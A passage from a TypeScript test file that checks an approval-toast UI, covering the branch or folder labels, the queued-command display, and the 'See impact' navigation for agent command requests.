    expect(toast().querySelector('[data-ui="approval-toast-conversation"]')).toHaveTextContent('Release notes')
    expect(toast().querySelector('[data-ui="approval-toast-place"]')).toHaveTextContent('feature/release')
    expect(toast().querySelector('[data-ui="approval-toast-command"]')).toHaveTextContent('npm version patch')
    expect(toast().querySelector('[data-ui="approval-toast-queue"]')?.textContent?.trim().startsWith('+2')).toBe(true)
    expect(toast().textContent).not.toContain('Checkout fix')
    await act(async () => { await userEvent.click(within(toast()).getByRole('button', { name: 'Open conversation' })) })
    expect(select).toHaveBeenCalledWith('B')
    useApprovalsStore.setState({ queue: [] })
  })

  test('a conversation without its own worktree shows the branch of its checkout, or its folder name without git; never an empty line', async () => {
    const getBranch = vi.fn(async ({ rootPath }: { rootPath: string }) => rootPath.endsWith('shop-git')
      ? { branch: 'main', detached: false, shortSha: 'abc1234', error: null }
      : { branch: null, detached: false, shortSha: null, error: 'not a git repository' })
    ;(window as unknown as { oxe: unknown }).oxe = { git: { getBranch } }
    for (const [root, expected] of [['C:/dev/shop-git', 'main'], ['C:/dev/plain-folder', 'plain-folder']]) {
      const visible = snap(thread('A', 'Checkout fix'), request('ra', impact('low', true)))
      const background = snap(thread('B', 'Release notes', { rootPath: root }), request('rb', impact('medium', true)))
      useThreadStore.setState({ snapshot: visible as never, snapshotCache: { A: visible, B: background } as never, selectedId: 'A', secondaryId: null } as never)
      render(<ApprovalsHost />)
      await waitFor(() => expect(toast().querySelector('[data-ui="approval-toast-place"]')?.textContent?.trim()).toBe(expected))
      expect(toast().querySelector('[data-ui="approval-toast-place"]')?.textContent).not.toMatch(/unavailable|indisponível/i)
      cleanup()
    }
  })

  test('See impact goes where the request needs: an irreversible one opens the impact dialog, a high reversible one opens its conversation', async () => {
    for (const [reversible, id] of [[false, 'irr'], [true, 'rev']] as Array<[boolean, string]>) {
      const select = vi.fn(async () => undefined)
      const visible = snap(thread('A', 'Checkout fix'), request('ra', impact('low', true)))
      const background = snap(thread('B', 'Release notes'), request(id, impact('high', reversible)))
      useThreadStore.setState({ snapshot: visible as never, snapshotCache: { A: visible, B: background } as never, selectedId: 'A', secondaryId: null, select } as never)
      useOpenRequest.getState().close()
      render(<ApprovalsHost />)
      await waitFor(() => toast())
      await act(async () => { await userEvent.click(within(toast()).getByRole('button', { name: cat('thread', 'f7.card.seeImpact') })) })
      if (reversible) {
        expect(select, 'the conversation at its card').toHaveBeenCalledWith('B')
        expect(useOpenRequest.getState().requestId).toBeNull()
      } else {
        expect(useOpenRequest.getState().requestId, 'the impact dialog').toBe(id)
      }
      cleanup()
    }
  })
})
